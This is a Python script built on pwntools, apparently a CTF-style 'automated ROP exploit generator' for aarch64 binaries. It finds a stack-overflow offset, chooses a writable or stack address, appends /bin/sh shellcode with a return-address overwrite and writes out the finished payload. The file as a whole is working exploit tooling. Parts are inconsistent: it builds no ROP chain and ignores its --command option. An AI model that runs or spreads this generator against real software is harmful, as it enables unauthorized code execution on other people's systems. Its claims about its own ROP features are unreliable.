import os
import argparse
from pwn import *
from offset_finder import find_offset, find_offset_file
from writable_memory_finder import analyze_binary

# Argument Parser Setup
parser = argparse.ArgumentParser(description="Automated ROP Exploit Generator")
parser.add_argument("--binary", required=True, help="Path to the vulnerable binary.")
parser.add_argument("--command", default="/bin/sh -c 'id'", help="Command to execute with execve.")
parser.add_argument("--output", default="exploit_payload", help="Path to output the generated exploit payload.")
parser.add_argument("--input-method", choices=['stdin', 'file'], default='stdin', help="Method of input: 'stdin' or 'file'.")
parser.add_argument("--input-arg", help="Additional argument if needed for 'file' input method.")
parser.add_argument("--breakpoint", default='main', help="Function to set breakpoint on.")
parser.add_argument("--padding-file", default="padding", help="Name of the padding file.")
parser.add_argument("--keep-file", action="store_true", help="Keep the padding file after execution.")
args = parser.parse_args()

# Setup Context
context.log_level = 'info'
context.arch = 'aarch64'

def construct_payload(offset, writable_memory, binary_path, cmd_args):
    """
    Constructs the exploit payload. Falls back to shellcode execution on the stack if needed.

    :param offset: Offset to overwrite the return address
    :param writable_memory: Writable memory sections and stack pointer
    :param binary_path: Path to the binary
    :param cmd_args: Command-line arguments for execve
    :return: Constructed payload
    """
    payload = b'A' * offset

    # Check writable memory sections
    writable_sections = writable_memory['writable_sections']
    stack_pointer = writable_memory['stack_pointer']

    # Use writable memory or fallback to stack
    if writable_sections:
        writable_addr = writable_sections[0]['start']  # Use the first writable section
        log.info(f"Using writable memory at address: {hex(writable_addr)}")
    elif stack_pointer:
        writable_addr = stack_pointer
        log.info(f"Using stack pointer address: {hex(writable_addr)} for writable memory")
    else:
        log.error("No writable memory or stack pointer identified.")
        return None

    # Constructing payload with shellcode
    shellcode = asm(shellcraft.sh())
    log.info(f"Using shellcode for payload. Shellcode size: {len(shellcode)} bytes.")
    payload += shellcode

    # Overwrite return address
    payload += p64(writable_addr)

    return payload

def main():
    """Main execution flow."""
    binary_path = args.binary
    log.info(f"Analyzing binary: {binary_path}")

    # Step 1: Find offset
    if args.input_method == 'file':
        offset = find_offset_file(
            binary_path=binary_path,
            input_method=args.input_method,
            input_arg=args.input_arg,
            breakpoint_func=args.breakpoint,
            padding_file=args.padding_file,
            keep_file=args.keep_file,
        )
    else:
        offset = find_offset(
            binary_path=binary_path,
            input_method=args.input_method,
            breakpoint_func=args.breakpoint,
            padding_file=args.padding_file,
            keep_file=args.keep_file,
        )

    if offset == -1:
        log.error("Failed to find offset. Exiting.")
        return

    log.success(f"Offset to overwrite return address: {offset}")

    # Step 2: Analyze writable memory
    writable_memory = analyze_binary(binary_path)
    if not writable_memory['writable_sections'] and not writable_memory['stack_pointer']:
        log.error("No writable memory identified. Exploit generation cannot continue.")
        return

    # Step 3: Construct the payload
    cmd_args = args.command.split()
    payload = construct_payload(offset, writable_memory, binary_path, cmd_args)

    if payload:
        # Step 4: Write the payload to the output file
        with open(args.output, 'wb') as f:
            f.write(payload)
        log.success(f"Payload written to {args.output}")
    else:
        log.error("Failed to construct payload.")

if __name__ == "__main__":
    main()
